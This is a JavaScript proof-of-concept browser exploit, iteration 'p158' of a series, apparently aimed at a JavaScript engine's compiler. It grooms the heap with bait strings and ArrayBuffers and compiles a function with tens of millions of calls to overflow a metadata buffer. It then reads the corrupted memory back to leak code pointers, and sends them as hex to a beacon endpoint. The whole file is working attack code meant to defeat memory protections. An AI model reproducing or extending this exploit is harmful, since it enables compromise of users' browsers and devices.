// p158 — Throw trick + main-thread AB extraction
//
// p156: bait-and-switch works, ALL 14 strings corrupted (.length=81400)
// p157: Adding ABs in Worker changed heap layout → process died before detection
//
// NEW APPROACH:
// - Main thread allocates baits (20 strings) THEN extraction ABs (10 ABs)
// - Worker allocates ONLY 14 target strings (proven layout from p156)
// - Free baits + GC → metadata buffer gets low slot
// - Compile THROW-FIRST function: `throw "X"; a(); a(); ...`
//   finishCreation writes ALL entries (4.29GB), THEN execution hits throw → caught
//   Process survives because MADV_FREE preserves virtual mappings (p156 proved this)
// - Main thread reads ABs directly → raw metadata entry bytes → code pointers
// - Worker also polls as fallback
//
// Beacon prefix: V158-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V158-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── WORKER (fallback detection only — same as p156) ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V158-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + targets[i].length);
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // Extended charCodeAt scan (100 sample offsets)
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue;
          beacon('SH' + i + '-' + len);
          var diffs = '';
          var offsets = [0,4,8,12,16,20,24,28,32,48,64,80,96,100,112,200,224,336,448,500,1000,2000,5000,10000,20000,50000,70000,80000,81000,81300];
          for (var o = 0; o < offsets.length; o++) {
            if (offsets[o] >= len) continue;
            var ch = targets[i].charCodeAt(offsets[o]);
            if (ch !== CANARY) {
              diffs += offsets[o] + ':' + hx(ch) + ',';
            }
          }
          if (diffs) beacon('DF' + i + '-' + diffs.substring(0, 200));
          else beacon('ALL41-' + i);
          if (i >= 3) break;
        }
        beacon('W-DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (low marge pages) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 1b: EXTRACTION ABs (mid marge pages — kept for post-throw read) ──
  var AB_SIZE = 100096;
  var N_AB = 10;
  var extractABs = [];
  var extractViews = [];
  for (var i = 0; i < N_AB; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var v = new Uint8Array(ab);
    // Leave zero-initialized — any non-zero = metadata entry data
    extractABs.push(ab);
    extractViews.push(v);
  }
  B('ABS-DONE-' + N_AB);

  // ── PHASE 2: WORKER ALLOCATES TARGET STRINGS (high marge pages) ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD THROW-FIRST OVERFLOW ──
  function phaseBuild() {
    B('BUILD-START');

    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    // THROW at bytecode 0 — finishCreation writes ALL entries, then throw fires
    var parts = ['window.__p158fn=function(a){throw "__P158__";'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__p158ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__p158ok ? 'OK' : 'FAIL'));
      if (!window.__p158fn) { B('NO-FN'); return; }

      // Start Worker polling
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');

        var survived = false;
        try {
          window.__p158fn(function(){});
          B('NO-THROW');
        } catch(ex) {
          if (ex === '__P158__') {
            survived = true;
            B('THROW-OK');
          } else {
            B('CATCH-' + String(ex).substring(0, 40));
          }
        }

        if (!survived) {
          B('DID-NOT-SURVIVE');
          return;
        }

        // ── PHASE 5: READ ABs (main thread survived!) ──
        setTimeout(function() {
          B('READ-START');
          var abHits = 0;

          for (var i = 0; i < extractViews.length; i++) {
            var view = extractViews[i];
            var first = -1;
            for (var j = 0; j < Math.min(4000, view.length); j++) {
              if (view[j] !== 0) { first = j; break; }
            }
            if (first < 0) {
              for (var j = 4000; j < Math.min(50000, view.length); j += 16) {
                if (view[j] !== 0) { first = j; break; }
              }
            }
            if (first < 0) continue;

            abHits++;
            B('AB' + i + '-HIT-' + first);

            // Dump first entry (112 bytes) in two halves
            var h1 = '';
            for (var b = first; b < first + 56 && b < view.length; b++) h1 += hx(view[b]);
            B('D' + i + 'a-' + h1);
            var h2 = '';
            for (var b = first + 56; b < first + 112 && b < view.length; b++) h2 += hx(view[b]);
            B('D' + i + 'b-' + h2);

            // 8-byte pointer values (little-endian)
            var ptrs = '';
            for (var p = 0; p < 112; p += 8) {
              var off = first + p;
              if (off + 8 > view.length) break;
              var nz = false;
              for (var v2 = 0; v2 < 8; v2++) { if (view[off + v2] !== 0) { nz = true; break; } }
              if (nz) {
                var h8 = '';
                for (var hh = 7; hh >= 0; hh--) h8 += hx(view[off + hh]);
                ptrs += p + ':' + h8 + ' ';
              }
            }
            if (ptrs) B('P' + i + '-' + ptrs.substring(0, 200));

            // Second entry for comparison
            var s2 = first + 112;
            if (s2 + 112 <= view.length) {
              var g1 = '';
              for (var b = s2; b < s2 + 56; b++) g1 += hx(view[b]);
              B('D' + i + 'c-' + g1);
              var g2 = '';
              for (var b = s2 + 56; b < s2 + 112; b++) g2 += hx(view[b]);
              B('D' + i + 'd-' + g2);

              // Compare: bytes that differ between entry 1 and 2
              var diff = '';
              for (var d = 0; d < 112; d++) {
                if (view[first + d] !== view[s2 + d]) {
                  diff += d + ':' + hx(view[first + d]) + '/' + hx(view[s2 + d]) + ' ';
                }
              }
              if (diff) B('DIFF' + i + '-' + diff.substring(0, 200));
            }

            if (abHits >= 3) break;
          }

          B('DONE-ab=' + abHits);
        }, 50);
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
